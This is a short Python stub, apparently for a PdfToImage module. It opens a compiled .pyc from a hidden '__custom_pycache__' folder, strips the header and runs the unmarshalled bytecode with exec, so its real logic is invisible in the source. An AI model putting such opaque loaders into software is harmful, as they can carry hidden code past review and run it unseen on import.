
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfToImage_5768b627aa3748cfbc8ba3455668abae.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
